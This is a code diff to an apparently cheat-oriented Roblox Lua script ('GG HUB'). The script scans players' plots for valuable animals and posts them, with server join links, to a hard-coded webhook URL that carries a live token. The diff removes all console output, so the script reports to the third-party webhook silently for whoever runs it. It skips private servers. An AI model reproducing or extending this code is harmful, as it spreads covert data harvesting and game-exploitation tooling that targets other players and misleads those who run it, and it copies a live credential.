@@ -4,9 +4,10 @@ local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1427505111982276719/OSz5uOz5-uue4DVdWWoGaORkmNponydKIXBNfvt2HRjGY_UJdXiTorm8KvfBMoeGE4FO"
-local cfg = {UpdateInterval = 10, MinValue = 9500000}
+local cfg = {UpdateInterval = 10, MinValue = 9900000}
 local lastUp = 0
 local sentAnimals = {}
+
 local function isPrivateServer()
     return game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
 end
@@ -46,28 +47,32 @@ local function findAnims(p)
     local a = {}
     local function srch(o)
         for _, c in pairs(o:GetChildren()) do
-            if c.Name == "AnimalPodiums" then
+            if c:IsA("Model") and c.Name == "AnimalPodiums" then
                 for _, pd in pairs(c:GetChildren()) do
-                    local s, d = pcall(function()
-                        local bs = pd:FindFirstChild("Base")
-                        local sp = bs and bs:FindFirstChild("Spawn")
-                        local at = sp and sp:FindFirstChild("Attachment")
-                        local oh = at and at:FindFirstChild("AnimalOverhead")
-                        local dp = oh and oh:FindFirstChild("DisplayName")
-                        local gn = oh and oh:FindFirstChild("Generation")
-                        if dp and gn then
-                            local dpTxt = dp.Text or dp.ContentText or ""
-                            local gnTxt = gn.Text or gn.ContentText or ""
-                            return {
-                                displayName = dpTxt, 
-                                generation = gnTxt, 
-                                position = sp.Position, 
-                                object = sp,
-                                value = parseVal(gnTxt)
-                            }
+                    if pd:IsA("Model") then
+                        local s, d = pcall(function()
+                            local bs = pd:FindFirstChild("Base")
+                            local sp = bs and bs:FindFirstChild("Spawn")
+                            local at = sp and sp:FindFirstChild("Attachment")
+                            local oh = at and at:FindFirstChild("AnimalOverhead")
+                            local dp = oh and oh:FindFirstChild("DisplayName")
+                            local gn = oh and oh:FindFirstChild("Generation")
+                            if dp and gn then
+                                local dpTxt = dp.Text or dp.ContentText or ""
+                                local gnTxt = gn.Text or gn.ContentText or ""
+                                return {
+                                    displayName = dpTxt, 
+                                    generation = gnTxt, 
+                                    position = sp.Position, 
+                                    object = sp,
+                                    value = parseVal(gnTxt)
+                                }
+                            end
+                        end)
+                        if s and d and d.displayName ~= "" then 
+                            table.insert(a, d) 
                         end
-                    end)
-                    if s and d and d.displayName ~= "" then table.insert(a, d) end
+                    end
                 end
             else 
                 srch(c) 
@@ -82,7 +87,6 @@ local function sendToWebhook(animals)
     if #animals == 0 then return end
     
     if isPrivateServer() then
-        print("table")
         return
     end
     
@@ -105,9 +109,9 @@ local function sendToWebhook(animals)
                     ["inline"] = true
                 },
                 {
-              ["name"] = "- JobID",
-             ["value"] = "https://farukixd.github.io/JoinHub/?placeId=109983668079237&gameInstanceId=" .. jobId,
-             ["inline"] = false
+                    ["name"] = "- JobID",
+                    ["value"] = "https://farukixd.github.io/JoinHub/?placeId=109983668079237&gameInstanceId=" .. jobId,
+                    ["inline"] = false
                 }
             },
             ["footer"] = {
@@ -164,22 +168,15 @@ local function sendToWebhook(animals)
                 Body = jsonData
             })
         else
-         return HttpService:PostAsync(WEBHOOK_URL, jsonData)
+            return HttpService:PostAsync(WEBHOOK_URL, jsonData)
         end
     end)
-    
-    if success then
-        print("e: " .. #animals .. " pet")
-    else
-        warn("e: " .. tostring(result))
-    end
 end
 
 local function findValuableAnimals()
     local valuableAnimals = {}
     local plts = Workspace:FindFirstChild("Plots")
     if not plts then 
-        warn("plot unfound")
         return valuableAnimals 
     end
     
@@ -192,7 +189,6 @@ local function findValuableAnimals()
                     if not sentAnimals[animalKey] then
                         table.insert(valuableAnimals, a)
                         sentAnimals[animalKey] = true
-                        print("Scanned: " .. a.displayName .. " - " .. a.generation)
                     end
                 end
             end
@@ -215,13 +211,6 @@ local function upd()
 end
 
 local function main()
-    if isPrivateServer() then
-        print("skip")
-    else
-        print("ðŸŒ GG HUB")
-    end
-    
-    print("work")
     upd()
     RunService.Heartbeat:Connect(upd)
 end
